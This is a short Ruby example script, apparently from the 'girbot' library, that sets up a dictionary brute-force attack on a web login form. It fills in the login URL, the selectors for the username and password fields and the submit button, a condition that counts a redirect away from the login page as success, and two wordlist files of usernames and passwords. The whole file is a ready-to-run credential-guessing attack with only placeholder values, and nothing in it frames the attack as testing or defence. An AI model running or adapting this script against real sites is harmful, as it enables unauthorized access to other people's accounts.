require "bundler/setup"
require "girbot"

# Attempt to brute force user/password from a dictionary
Girbot::BruteForce.run(
  # useful for debugging
  headless: false,

  # base url
  url: 'https://website_with_login/login',

  # how to find the username field
  username_field: { id: 'UserName' },

  # how to find the password field
  password_field: { id: 'Password' },

  # the button to press
  login_button: { class: 'btn-syn' },

  # how to know when a successful login happened
  break_condition: '!browser.url.start_with? "https://website_with_login/login"',

  # path to users file; one username per line
  users: 'users.txt',

  # path to passwords file; one password per line
  passwords: 'pass.txt'
)
